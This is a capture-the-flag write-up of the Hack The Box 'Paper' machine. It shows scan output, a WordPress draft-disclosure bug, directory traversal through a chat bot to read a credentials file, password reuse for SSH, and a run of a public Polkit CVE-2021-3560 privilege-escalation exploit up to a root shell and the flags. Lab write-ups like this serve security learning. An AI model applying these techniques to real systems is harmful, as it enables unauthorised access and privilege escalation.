# Paper

## Enumeration

### nmap

```
PORT    STATE SERVICE  REASON  VERSION
22/tcp  open  ssh      syn-ack OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDcZzzauRoUMdyj6UcbrSejflBMRBeAdjYb2Fkpkn55uduA3qShJ5SP33uotPwllc3wESbYzlB9bGJVjeGA2l+G99r24cqvAsqBl0bLStal3RiXtjI/ws1E3bHW1+U35bzlInU7AVC9HUW6IbAq+VNlbXLrzBCbIO+l3281i3Q4Y2pzpHm5OlM2mZQ8EGMrWxD4dPFFK0D4jCAKUMMcoro3Z/U7Wpdy+xmDfui3iu9UqAxlu4XcdYJr7Iijfkl62jTNFiltbym1AxcIpgyS2QX1xjFlXId7UrJOJo3c7a0F+B3XaBK5iQjpUfPmh7RLlt6CZklzBZ8wsmHakWpysfXN
|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBE/Xwcq0Gc4YEeRtN3QLduvk/5lezmamLm9PNgrhWDyNfPwAXpHiu7H9urKOhtw9SghxtMM2vMIQAUh/RFYgrxg=
|   256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKdmmhk1vKOrAmcXMPh0XRA5zbzUHt1JBbbWwQpI4pEX

80/tcp  open  http     syn-ack Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
|_http-title: HTTP Server Test Page powered by CentOS
| http-methods: 
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE

443/tcp open  ssl/http syn-ack Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
| http-methods: 
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
|_http-title: HTTP Server Test Page powered by CentOS
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US/emailAddress=root@localhost.localdomain
| Subject Alternative Name: DNS:localhost.localdomain
| Issuer: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US/organizationalUnitName=ca-3899279223185377061/emailAddress=root@localhost.localdomain
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-07-03T08:52:34
| Not valid after:  2022-07-08T10:32:34
| MD5:   579a 92bd 803c ac47 d49c 5add e44e 4f84
| SHA-1: 61a2 301f 9e5c 2603 a643 00b5 e5da 5fd5 c175 f3a9
| -----BEGIN CERTIFICATE-----
| MIIE4DCCAsigAwIBAgIIdryw6eirdUUwDQYJKoZIhvcNAQELBQAwgY8xCzAJBgNV
| BAYTAlVTMRQwEgYDVQQKDAtVbnNwZWNpZmllZDEfMB0GA1UECwwWY2EtMzg5OTI3
| OTIyMzE4NTM3NzA2MTEeMBwGA1UEAwwVbG9jYWxob3N0LmxvY2FsZG9tYWluMSkw
| JwYJKoZIhvcNAQkBFhpyb290QGxvY2FsaG9zdC5sb2NhbGRvbWFpbjAeFw0yMTA3
| MDMwODUyMzRaFw0yMjA3MDgxMDMyMzRaMG4xCzAJBgNVBAYTAlVTMRQwEgYDVQQK
| DAtVbnNwZWNpZmllZDEeMBwGA1UEAwwVbG9jYWxob3N0LmxvY2FsZG9tYWluMSkw
| JwYJKoZIhvcNAQkBFhpyb290QGxvY2FsaG9zdC5sb2NhbGRvbWFpbjCCASIwDQYJ
| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAL1/3n1pZvFgeX1ja/w84jNxT2NcBkux
| s5DYnYKeClqncxe7m4mz+my4uP6J1kBP5MudLe6UE62KFX3pGc6HCp2G0CdA1gQm
| 4WYgF2E7aLNHZPrKQ+r1fqBBw6o3NkNxS4maXD7AvrCqkgpID/qSziMJdUzs9mS+
| NTzWq0IuSsTztLpxUEFv7T6XPGkS5/pE2hPWO0vz/Bd5BYL+3P08fPsC0/5YvgkV
| uvFbFrxmuOFOTEkrTy88b2fLkbt8/Zeh4LSdmQqriSpxDnag1i3N++1aDkIhAhbA
| LPK+rZq9PmUUFVY9MqizBEixxRvWhaU9gXMIy9ZnPJPpjDqyvju5e+kCAwEAAaNg
| MF4wDgYDVR0PAQH/BAQDAgWgMAkGA1UdEwQCMAAwIAYDVR0RBBkwF4IVbG9jYWxo
| b3N0LmxvY2FsZG9tYWluMB8GA1UdIwQYMBaAFBB8mEcpW4ZNBIaoM7mCF/Z+7ffA
| MA0GCSqGSIb3DQEBCwUAA4ICAQCw4uQfUe+FtsPdT0eXiLHg/5kXBGn8kfJZ45hP
| gcuwa5JfAQeA3JXx7piTSiMMk0GrWbqbrpX9ZIkwPnZrN+9PV9/SNCEJVTMy+LDQ
| QGsyqwkZpMK8QThzxRvXvnyf3XeEFDL6N4YeEzWz47VNlddeqOBHmrDI5SL+Eibh
| wxNj9UXwhEySUpgMAhU+QtXk40sjgv4Cs3kHvERvpwAfgRA7N38WY+njo/2VlGaT
| qP+UekP42JveOIWhf9p88MUmx2QqtOq/WF7vkBVbAsVs+GGp2SNhCubCCWZeP6qc
| HCX0/ipKZqY6zIvCcfr0wHBQDY9QwlbJcthg9Qox4EH1Sgj/qKPva6cehp/NzsbS
| JL9Ygb1h65Xpy/ZwhQTl+y2s+JxAoMy3k50n+9lzCFBiNzPLsV6vrTXCh7t9Cx07
| 9jYqMiQ35cEbQGIaKQqzguPXF5nMvWDBow3Oj7fYFlCdLTpaTjh8FJ37/PrhUWIl
| Li+WW8txrQKqm0/u1A41TI7fBxlUDhk6YFA+gIxX27ntQ0g+lLs8rwGlt/o+e3Xa
| OfcJ7Tl0ovWa+c9lWNju5mgdU+0v4P9bqv4XcIuyE0exv5MleA99uOYE1jlWuKf1
| m9v4myEY3dzgw3IBDmlYpGuDWQmMYx8RVytYN3Z3Z64WglMRjwEWNGy7NfKm7oJ4
| mh/ptg==
|_-----END CERTIFICATE-----

```
### Gobuster

```
/.hta                 (Status: 403) [Size: 199]
/.htaccess            (Status: 403) [Size: 199]
/.htpasswd            (Status: 403) [Size: 199]
/cgi-bin/             (Status: 403) [Size: 199]
/manual               (Status: 301) [Size: 237] [--> http://10.129.148.234/manual/]


/.hta                 (Status: 403) [Size: 199]
/.htaccess            (Status: 403) [Size: 199]
/.htpasswd            (Status: 403) [Size: 199]
/developer            (Status: 301) [Size: 247] [--> http://10.129.148.234/manual/developer/]
/faq                  (Status: 301) [Size: 241] [--> http://10.129.148.234/manual/faq/]      
/howto                (Status: 301) [Size: 243] [--> http://10.129.148.234/manual/howto/]    
/images               (Status: 301) [Size: 244] [--> http://10.129.148.234/manual/images/]   
/index.html           (Status: 200) [Size: 9164]                                             
/LICENSE              (Status: 200) [Size: 11358]                                            
/misc                 (Status: 301) [Size: 242] [--> http://10.129.148.234/manual/misc/]     
/mod                  (Status: 301) [Size: 241] [--> http://10.129.148.234/manual/mod/]      
/programs             (Status: 301) [Size: 246] [--> http://10.129.148.234/manual/programs/] 
/ssl                  (Status: 301) [Size: 241] [--> http://10.129.148.234/manual/ssl/]      
/style                (Status: 301) [Size: 243] [--> http://10.129.148.234/manual/style/] 

```

AS I don't trust hackthebox alot I added nikto to my enumeration process

### nikto

```
---------------------------------------------------------------------------
+ Target IP:          10.129.148.234
+ Target Hostname:    10.129.148.234
+ Target Port:        80
+ Start Time:         2022-02-06 19:39:30 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'x-backend-server' found, with contents: office.paper
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-powered-by header: PHP/7.2.24
+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD, TRACE 
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3268: /manual/images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8743 requests: 12 error(s) and 11 item(s) reported on remote host
+ End Time:           2022-02-06 20:19:30 (GMT1) (2400 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

Indeed! there is a hint now! x-backend-server suggest a domain name

I add `office.paper` to my `/etc/hosts` and can access the real website (instead of server manual)

Damn I love "the office"

```
Michael, you should remove the secret content from your drafts ASAP, as they are not that secure as you think!
-Nick
```


As it is proudly powered by wordpress I go for a wpscan

```
+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
 |  - X-Powered-By: PHP/7.2.24
 |  - X-Backend-Server: office.paper
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] WordPress readme found: http://office.paper/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress version 5.2.3 identified (Insecure, released on 2019-09-05).
 | Found By: Rss Generator (Passive Detection)
 |  - http://office.paper/index.php/feed/, <generator>https://wordpress.org/?v=5.2.3</generator>
 |  - http://office.paper/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.2.3</generator>

[+] WordPress theme in use: construction-techup
 | Location: http://office.paper/wp-content/themes/construction-techup/
 | Last Updated: 2021-07-17T00:00:00.000Z
 | Readme: http://office.paper/wp-content/themes/construction-techup/readme.txt
 | [!] The version is out of date, the latest version is 1.4
 | Style URL: http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1
 | Style Name: Construction Techup
 | Description: Construction Techup is child theme of Techup a Free WordPress Theme useful for Business, corporate a...
 | Author: wptexture
 | Author URI: https://testerwp.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1, Match: 'Version: 1.1'

 [i] User(s) Identified:

[+] prisonmike
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://office.paper/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] nick
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://office.paper/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] creedthoughts
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)


```

I also found alot of wordpress vulnerablities for this version 

but this one is relevant to Nick's comment

```
 | [!] Title: WordPress < 5.4.1 - Unauthenticated Users View Private Posts
 |     Fixed in: 5.2.6
 |     References:
 |      - https://wpscan.com/vulnerability/d1e1ba25-98c9-4ae7-8027-9632fb825a56
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11028
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47635/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-xhx9-759f-6p2w

```
Google it to understand this `http://office.paper/?static=1`

```


# Warning for Michael

Michael, you have to stop putting secrets in the drafts. It is a huge security issue and you have to stop doing it. -Nick

Threat Level Midnight

A MOTION PICTURE SCREENPLAY,
WRITTEN AND DIRECTED BY
MICHAEL SCOTT

[INT:DAY]

Inside the FBI, Agent Michael Scarn sits with his feet up on his desk. His robotic butler Dwigt….

# Secret Registration URL of new Employee chat system

http://chat.office.paper/register/8qozr226AhkCHZdyY

# I am keeping this draft unpublished, as unpublished drafts cannot be accessed by outsiders. I am not that ignorant, Nick.

# Also, stop looking at my drafts. Jeez!


```

Add the new subdomain to your hosts and register to the given address

`Rocketchat` looks cool

In the general chat you learn about `recyclops`

its a cool bot designed by dwight, and it takes commands

```
...

 <=====The following two features are for those boneheads, who still don't know how to use scp. I'm Looking at you Kevin.=====>
For security reasons, the access is limited to the Sales folder.
3. Files:
eg: 'recyclops get me the file test.txt', or 'recyclops could you send me the file sale/secret.xls' or just 'recyclops file test.txt'
4. List:
You can ask me to list the files
eg: 'recyclops i need directory list sale' or just 'recyclops list sale'

...

```
Lmao the bot says listing is limited to the sales folder

But actually no filter is present for classic directory trasversal

Just combine `../` with `list` and then `file` command

As much as needed!

ok I was mad confused when `.ssh` folder was empty but hey we love enumerating

so...in the `hubot` folder

```
 <!=====Contents of file ../hubot/.env=====>
export ROCKETCHAT_URL='http://127.0.0.1:48320'
export ROCKETCHAT_USER=recyclops
export ROCKETCHAT_PASSWORD=Queenofblad3s!23
export ROCKETCHAT_USESSL=false
export RESPOND_TO_DM=true
export RESPOND_TO_EDITED=true
export PORT=8000
export BIND_ADDRESS=127.0.0.1
<!=====End of file ../hubot/.env=====>
```

First i tried to ssh as "recyclops:Queenofblad3s!23"

But it didnt work...wich confuses a bit more

But hey remember we can read /etc/passwd too

I check and there is a `dwight` user...and wo owns recyclops?

Yeah that's right `dwight:Queenofblad3s!23`

```
└──╼ $ssh dwight@10.129.148.234
dwight@10.129.148.234's password: 
Activate the web console with: systemctl enable --now cockpit.socket

Last login: Tue Feb  1 09:14:33 2022 from 10.10.14.23
[dwight@paper ~]$ id
uid=1004(dwight) gid=1004(dwight) groups=1004(dwight)

[dwight@paper ~]$ cat user.txt
dwight_you_ignorant_time_thief

```

## Privilege escalation

```
...

Sorry, user dwight may not run sudo on paper.
[dwight@paper ~]$ find / -perm -u=s 2>/dev/null
/usr/bin/fusermount
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/crontab
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/at
/usr/bin/sudo
/usr/bin/fusermount3
/usr/sbin/grub2-set-bootflag
/usr/sbin/pam_timestamp_check
/usr/sbin/unix_chkpwd
/usr/sbin/userhelper
/usr/sbin/mount.nfs
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/libexec/dbus-1/dbus-daemon-launch-helper
/usr/libexec/qemu-bridge-helper
/usr/libexec/cockpit-session
/usr/libexec/sssd/krb5_child
/usr/libexec/sssd/ldap_child
/usr/libexec/sssd/proxy_child
/usr/libexec/sssd/selinux_child
/usr/libexec/spice-gtk-x86_64/spice-client-glib-usb-acl-helper
/usr/libexec/Xorg.wrap

```

Ok this was a very confusing part!

This is what got me on tracks `/usr/lib/polkit-1/polkit-agent-helper-1`

and checking the forums confirmed it

also the author had the exploit on his github XD

still...its was not obvious at all 

kinda normal as this vlnerability isnt that easy to identify

But it is old and If you used linpeas you probably did not miss it
 
Luckilly I already did two rooms about this on tryhackme

First I compiled and ran a C exploit for "pwnkit" but failed

seems like the author patched that recently! 

its actually `CVE-2021-3560` that is meant to be used

Not `CVE-2021-4034` (PWNKIT)...ha! 

You can do it manually then using `dbus-send` like in [here](https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/)

Or if you are kinda lazy too get a [github exploit](https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation)

Or you can write your own...

'ey! your choice...me I chose lazyness 

```
[dwight@paper tmp]$ touch exploit.py
[dwight@paper tmp]$ nano exploit.py
[dwight@paper tmp]$ python exploit.py
bash: python: command not found...

[dwight@paper tmp]$ python3 exploit.py
**************
Exploit: Privilege escalation with polkit - CVE-2021-3560
Exploit code written by Ahmad Almorabea @almorabea
Original exploit author: Kevin Backhouse 
For more details check this out: https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/
**************
[+] Starting the Exploit 
id: 'ahmed': no such user
id: 'ahmed': no such user
id: 'ahmed': no such user
id: 'ahmed': no such user
id: 'ahmed': no such user
...

[+] User Created with the name of ahmed
[+] Timed out at: 0.00833322300032699
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.
Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
...

Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
[+] Timed out at: 0.007874564154874596
[+] Exploit Completed, Your new user is 'Ahmed' just log into it like, 'su ahmed', and then 'sudo su' to root 

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

bash: cannot set terminal process group (106737): Inappropriate ioctl for device
bash: no job control in this shell
[root@paper tmp]# id
uid=0(root) gid=0(root) groups=0(root)
```

Now I am ahmed and I can root! look at me go!

```
[root@paper tmp]# cd /root
[root@paper ~]# ls
anaconda-ks.cfg  initial-setup-ks.cfg  root.txt
[root@paper ~]# cat root.txt
polkit_flag_from_prisonmike
[root@paper ~]# 
```
Damn! those "easy" rooms on hackthebox make me feel more stupid than usual



